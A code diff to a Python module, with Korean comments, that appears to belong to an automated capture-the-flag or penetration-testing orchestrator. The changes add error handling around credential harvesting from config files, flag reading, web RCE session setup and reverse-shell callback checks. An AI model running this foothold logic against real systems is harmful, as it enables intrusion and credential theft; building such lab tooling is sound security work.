@@ -13,7 +13,7 @@ Orchestrator 가 이 믹스인을 상속해 런타임 동작은 완전히 동일
 
 from __future__ import annotations
 
-from typing import TYPE_CHECKING
+from typing import TYPE_CHECKING, Any
 
 from . import provenance as _prov
 from .flag import FlagHit
@@ -39,6 +39,7 @@ class FootholdMixin:
         dry_run: bool
         flag_kind: str
         world: "WorldModel"
+        audit: Any   # 덕타이핑 audit(.event(...)) — 런타임엔 Orchestrator 의 NullAudit/AuditLog
 
         def _record_flag(self, report: "OrchestrationReport", hit, prov=...) -> bool: ...
 
@@ -115,19 +116,24 @@ class FootholdMixin:
         if session is None or not session.alive:
             return
         from . import cred_sources, flag_read
-        # 자격 수확
-        for cmd in cred_sources.config_reads(self.world.web_product):
-            out = session.run(cmd)
-            for u, p, _label in cred_sources.parse_config_creds(out):
-                self.world.add_cred(f"{u}:{p}", source="설정파일")
-        # 플래그 수집(채널 무관) — [S4-2] 단일 경로로 report.flags 에도 반영한다. 과거엔
-        # world.add_flag '만' 불러 발판으로 읽은 플래그가 report.user/root_flag·goal_reached
-        # 에 안 잡혔다(상태원 분기). 발판 세션 직독이므로 provenance=exploit-derived.
-        # (발판 세션 획득·전송 로직은 불변 — 여기선 '이미 읽은' 플래그의 상태 반영만 바꾼다.)
-        for kind, val in flag_read.read_flags(session, flag_kind=self.flag_kind).items():
-            prov = _prov.FlagProvenance(kind, val, "<발판 세션 직독>", "foothold",
-                                        "exploit-derived", "발판 세션에서 직접 읽음")
-            self._record_flag(report, FlagHit(val, kind, "발판"), prov)
+        # 발판 세션 송수신(session.run)은 소켓/HTTP 실행 표면이라 런타임에 끊길 수 있다. 여기서
+        # 터진 예외가 _foothold_stage 밖으로 새면 뒤따르는 생성 전용 준비 스테이지(revshell/
+        # lateral/crack/privesc·평가·심판)가 통째로 생략된다(오케스트레이터 F3 가 흡수하지만 손실).
+        # 세션 I/O 오류는 '발판 중단'으로 흡수하고, 그때까지 수확/읽은 것은 유지한다(안전 degrade).
+        try:
+            # 자격 수확
+            for cmd in cred_sources.config_reads(self.world.web_product):
+                out = session.run(cmd)
+                for u, p, _label in cred_sources.parse_config_creds(out):
+                    self.world.add_cred(f"{u}:{p}", source="설정파일")
+            # 플래그 수집(채널 무관) — [S4-2] 단일 경로로 report.flags 에도 반영한다. 발판 세션
+            # 직독이므로 provenance=exploit-derived.
+            for kind, val in flag_read.read_flags(session, flag_kind=self.flag_kind).items():
+                prov = _prov.FlagProvenance(kind, val, "<발판 세션 직독>", "foothold",
+                                            "exploit-derived", "발판 세션에서 직접 읽음")
+                self._record_flag(report, FlagHit(val, kind, "발판"), prov)
+        except OSError as e:   # 세션 소켓/전송 오류 → 발판 중단(이후 준비 스테이지는 계속)
+            self.audit.event("foothold_session_error", error=f"{type(e).__name__}: {e}")
 
     def _acquire_session(self, report, host):
         """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
@@ -160,8 +166,17 @@ class FootholdMixin:
         url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
         ws = WebRceSession(url, "cmd", method="POST", inject="body")
         ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
-        # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
-        if looks_like_shell(ws.run(verify_probe_command())):
+        # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지). HTTP 요청
+        # 자체가 런타임에 실패(연결거부·타임아웃·TLS)하면 '발판 미확보'로 degrade 해 None 을
+        # 반환한다 — 그래야 리버스셸 폴백·이후 준비 스테이지로 진행한다(감사 A-MED). requests
+        # 예외 타입은 선택 의존이라 직접 못 잡으므로 넓게 잡되, 안전 경계(생성 전용)는 불변.
+        try:
+            out = ws.run(verify_probe_command())
+        except Exception as e:   # noqa: BLE001 — 요청 실패 → 발판 미확보(폴백/준비 스테이지 진행)
+            self.audit.event("foothold_skip", reason="web_probe_error",
+                             detail=f"{type(e).__name__}: {e}")
+            return None
+        if looks_like_shell(out):
             return ws
         return None
 
@@ -196,8 +211,16 @@ class FootholdMixin:
             return None
         if session is None:
             return None
-        # ★ 성립 검증: 콜백이 와도 실제 셸 신호(uid=/uname)가 없으면 폐기(거짓 발판 방지)
-        if session.alive and looks_like_shell(session.run(verify_probe_command())):
+        # ★ 성립 검증: 콜백이 와도 실제 셸 신호(uid=/uname)가 없으면 폐기(거짓 발판 방지).
+        # 검증 송수신(session.run)도 소켓 I/O 라 accept 직후 리셋될 수 있다 — 여기서 OSError 가
+        # 나면 세션을 닫고 발판 미확보로 degrade(세션 누수·이후 스테이지 생략 방지, 감사 A-LOW).
+        try:
+            ok = bool(session.alive and looks_like_shell(session.run(verify_probe_command())))
+        except OSError as e:
+            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
+            session.close()
+            return None
+        if ok:
             self.audit.event("revshell_foothold", lhost=lhost, lport=int(lport))
             return session
         session.close()
